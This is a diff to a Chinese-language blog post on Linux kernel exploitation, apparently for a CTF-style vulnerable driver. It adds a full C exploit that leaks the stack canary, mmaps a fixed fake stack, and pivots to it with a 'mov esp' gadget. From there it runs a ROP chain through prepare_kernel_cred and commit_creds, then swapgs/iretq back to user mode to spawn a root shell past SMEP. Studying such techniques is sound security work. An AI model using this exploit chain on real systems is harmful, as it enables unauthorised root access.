@@ -1,7 +1,7 @@
 ---
 layout: post
 tags: [kernel_pwn]
-title: "kernel stack 2: ret2usr & ROP"
+title: "kernel stack 2: canary+smep绕过"
 author: wsxk
 date: 2026-9-10
 comments: true
@@ -440,7 +440,60 @@ cat gadgets.txt | grep -E 'mov esp.*0 ;'  # 能找到且很多
 ```
 ![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2026-4-26/20260830233524.png)
 **只要修改了`esp`寄存器，我们只要在用户态通过mmap申请一块地址为0x5b000000的内存，设置可读可写标志即可**<br>
-这里想必大家有个疑惑:<br>
+这里想必大家有个疑惑:**改动esp，相当于改了低4字节，高4字节没改动怎么办啊？**<br>
+答案在以下链接[http://x86asm.net/articles/x86-64-tour-of-intel-manuals/#General-purpose-Registers](http://x86asm.net/articles/x86-64-tour-of-intel-manuals/#General-purpose-Registers),简而言之，操纵esp寄存器会自动清0其高4字节的值。<br>
+```c
+unsigned long pop_rdi_ret = 0xffffffff81006370;
+unsigned long cmp_esi_esi_ret = 0xffffffff81906934;
+unsigned long mov_rdi_rax_ja_pop_rbp_ret = 0xffffffff818c6ebd;
+unsigned long swapgs_pop_rbp_ret = 0xffffffff8100a55f;
+unsigned long iretq = 0xffffffff8100c0d9;
+unsigned long mov_esp_pop_r12_pop_rbp_ret = 0xffffffff8196f56a;
+unsigned long * fake_stack;
+int main(){
+    // step 0 : save status
+    save_status();
+
+    int fd =open_device();
+    // step 1: leak the canary
+    unsigned long tmp_buf[50];
+    unsigned long size=0x8*50;
+    read(fd,tmp_buf,size);
+    unsigned long canary = tmp_buf[16];
+    printf("canary: 0x%llx\n",canary);
+
+    // step 2: construct fake stack
+    fake_stack = mmap(0x5b000000-0x1000, 0x2000,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED,-1,0);
+    int off = 0x1000/8;
+    fake_stack[0] = 0xdeadbeef;
+    fake_stack[off++] = 0;
+    fake_stack[off++] = 0;
+    fake_stack[off++] = pop_rdi_ret;
+    fake_stack[off++] = 0;
+    fake_stack[off++] = prepare_kernel_cred;
+    fake_stack[off++] = cmp_esi_esi_ret;
+    fake_stack[off++] = mov_rdi_rax_ja_pop_rbp_ret;
+    fake_stack[off++] = 0 ;
+    fake_stack[off++] = commit_creds;
+    fake_stack[off++] = swapgs_pop_rbp_ret;
+    fake_stack[off++] = 0; 
+    fake_stack[off++] = iretq;
+    fake_stack[off++] = (unsigned long )get_root_shell;
+    fake_stack[off++] = user_cs;
+    fake_stack[off++] = user_rflags;
+    fake_stack[off++] = user_sp;
+    fake_stack[off++] = user_ss;
+    // step 3: construct the payload
+    off = 17;
+    tmp_buf[off++] = 0;
+    tmp_buf[off++] = 0;
+    tmp_buf[off++] = 0;
+    tmp_buf[off++] = mov_esp_pop_r12_pop_rbp_ret;
+    write(fd,tmp_buf,size);   
+}
+```
+我们从0x5b000000-0x1000位置开始mmap内存，是因为prepare_kernel_cred等函数也会使用函数，需要预留栈空间。另外一个注意点是：mmap申请的page需要在被访问时才会插入页表（1个page），所以才需要先对page进行赋值。<br>
+
 
 
 # references<br>
